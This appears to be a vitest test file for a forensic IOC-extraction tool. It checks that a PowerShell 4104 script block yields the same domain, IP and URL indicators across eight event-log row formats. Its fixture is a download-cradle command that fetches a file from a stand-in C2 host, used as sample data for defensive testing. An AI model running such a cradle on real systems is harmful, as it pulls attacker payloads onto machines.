// A PowerShell script block reaches this tool in many row shapes, and for a long time only ONE of
// them produced IOCs. The other shapes each yielded a plausible-looking timeline event — correct
// host, correct time, readable description — with an EMPTY ioc list, which is precisely why the gap
// survived review: nothing about the imported case looked wrong (#652).
//
// So this is deliberately a MATRIX, not a fixture. One script, one expected IOC set, every shape and
// every importer that can carry a 4104 asserted against it. A new collection shape (a new artifact,
// a new tool's output profile) is covered by adding a row here; if it does not extract, the table
// makes that visible instead of leaving it to be discovered on a case.
import { describe, it, expect } from "vitest";
import { parseVelociraptorJson } from "../../src/analysis/velociraptorImport.js";
import { parseEvtxXml } from "../../src/analysis/evtxXmlImport.js";
import { parseChainsawReport } from "../../src/analysis/chainsawImport.js";
import { parseSiemExport } from "../../src/analysis/siemImport.js";
import type { SiemIoc } from "../../src/analysis/siemImport.js";

const SCRIPT = "iwr http://beacon.evil-c2.net/x -OutFile a.bin; $ip='185.220.101.44'";
// What the script names, and therefore what EVERY shape below must yield.
const EXPECTED = ["domain:beacon.evil-c2.net", "ip:185.220.101.44", "url:http://beacon.evil-c2.net/x"];

const CHANNEL = "Microsoft-Windows-PowerShell/Operational";
const HOST = "WS-01";
const WHEN = "2026-05-07T16:31:04.000Z";
const SBID = "1f6a0d2c-4b77-4d1e-9a54-6b0f2f7a1c33";
const RENDERED = `Creating Scriptblock text (1 of 1):\n${SCRIPT}\n\nScriptBlock ID: ${SBID}`;

const iocKeys = (iocs: SiemIoc[]): string[] =>
  iocs
    .filter((i) => i.type === "domain" || i.type === "ip" || i.type === "url")
    .map((i) => `${i.type}:${i.value}`)
    .sort();

// The parsed-event halves shared by the native shapes — nested `System` + `EventData`, exactly as
// Velociraptor's evtx parser emits them.
const SYSTEM = {
  EventID: 4104,
  Channel: CHANNEL,
  Computer: HOST,
  TimeCreated: { SystemTime: WHEN },
};
const EVENT_DATA = {
  ScriptBlockText: SCRIPT,
  ScriptBlockId: SBID,
  MessageNumber: 1,
  MessageTotal: 1,
};

// Each case: a row (or document) in one real collection shape, and the importer that reads it.
const CASES: { name: string; iocs: () => string[] }[] = [
  {
    // A: a natively parsed evtx row, no rendered message at all. The script exists ONLY in the
    // structured EventData.
    name: "Velociraptor native evtx row (System + EventData)",
    iocs: () => {
      const r = parseVelociraptorJson(
        JSON.stringify({ _Artifact: "Windows.EventLogs.Evtx", System: SYSTEM, EventData: EVENT_DATA }),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // B: the same row plus the rendered message. The script text is now present TWICE and still used
    // to yield nothing — the sharpest form of the bug, since the event an analyst reads on screen
    // contained the C2 in full.
    name: "Velociraptor native evtx row + rendered Message",
    iocs: () => {
      const r = parseVelociraptorJson(
        JSON.stringify({
          _Artifact: "Windows.EventLogs.Evtx",
          System: SYSTEM,
          EventData: EVENT_DATA,
          Message: RENDERED,
        }),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // C: Windows.EventLogs.PowershellScriptblock — Velociraptor's OWN script-block artifact and the
    // ordinary way to hunt 4104. It emits a flat row with no parsed event around it, so the script
    // arrives as a bare top-level column.
    name: "Velociraptor Windows.EventLogs.PowershellScriptblock (flat row)",
    iocs: () => {
      const r = parseVelociraptorJson(
        JSON.stringify({
          _Artifact: "Windows.EventLogs.PowershellScriptblock",
          ScriptBlockText: SCRIPT,
          ScriptBlockId: SBID,
          Computer: HOST,
          EventTime: WHEN,
        }),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // D: DetectRaptor's flattened dotted-key shape. The one shape that always worked — kept in the
    // table as the control: if this row ever stops extracting, the regression is in the scrapers
    // themselves rather than in shape routing.
    name: "DetectRaptor flattened detection row (dotted keys)",
    iocs: () => {
      const r = parseVelociraptorJson(
        JSON.stringify({
          "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
          "Detection.Name": "PowerShell - Suspicious Download Cradle",
          "@timestamp": WHEN,
          Computer: HOST,
          "System.EventID.Value": 4104,
          "System.Channel": CHANNEL,
          "EventData.ScriptBlockId": SBID,
          "EventData.MessageNumber": 1,
          "EventData.MessageTotal": 1,
          "EventData.ScriptBlockText": SCRIPT,
          Message: RENDERED,
        }),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // E: a Sigma detection wrapping a native 4104 — the highest-signal row this importer handles.
    // mapSigma overlays the verdict onto the parsed event and returns straight from that branch, so
    // a fix applied to the eventlog path alone does NOT reach this shape.
    name: "Velociraptor Sigma detection wrapping a native 4104",
    iocs: () => {
      const r = parseVelociraptorJson(
        JSON.stringify({
          _Artifact: "Windows.Detection.Sigma",
          Rule: { Title: "Suspicious PowerShell download cradle", Level: "high" },
          System: SYSTEM,
          EventData: EVENT_DATA,
        }),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // F: raw EVTX XML (wevtutil / Event Viewer export) — no Velociraptor anywhere in the path. It
    // shares mapWindows with the shapes above, so it shares their blind spot too.
    name: "raw EVTX XML export",
    iocs: () => {
      const xml = `<?xml version="1.0" encoding="utf-8"?>
<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell"/>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="${WHEN}"/>
    <Channel>${CHANNEL}</Channel>
    <Computer>${HOST}</Computer>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockId">${SBID}</Data>
    <Data Name="ScriptBlockText">${SCRIPT}</Data>
  </EventData>
</Event>
</Events>`;
      return iocKeys(parseEvtxXml(xml).iocs);
    },
  },
  {
    // G: a Chainsaw report row carrying the parsed event document.
    name: "Chainsaw report row",
    iocs: () => {
      const r = parseChainsawReport(
        JSON.stringify([
          {
            name: "PowerShell Suspicious Download Cradle",
            level: "high",
            timestamp: WHEN,
            document: { data: { Event: { System: SYSTEM, EventData: EVENT_DATA } } },
          },
        ]),
      );
      return iocKeys(r.iocs);
    },
  },
  {
    // H: a generic SIEM/NDJSON export of the same event (Elastic-style winlog record).
    name: "SIEM export record",
    iocs: () => {
      const r = parseSiemExport(
        JSON.stringify([
          {
            "@timestamp": WHEN,
            winlog: {
              channel: CHANNEL,
              event_id: 4104,
              computer_name: HOST,
              event_data: EVENT_DATA,
            },
          },
        ]),
      );
      return iocKeys(r.iocs);
    },
  },
];

describe("PowerShell 4104 script block — same script, same IOCs, every row shape (#652)", () => {
  for (const c of CASES) {
    it(`extracts the C2 url, ip and domain from: ${c.name}`, () => {
      expect(c.iocs()).toEqual(EXPECTED);
    });
  }

  // The point of the matrix stated as one assertion: no shape may be a special case.
  it("yields an identical IOC set across every shape", () => {
    const sets = CASES.map((c) => c.iocs());
    for (const s of sets) expect(s).toEqual(sets[0]);
  });
});
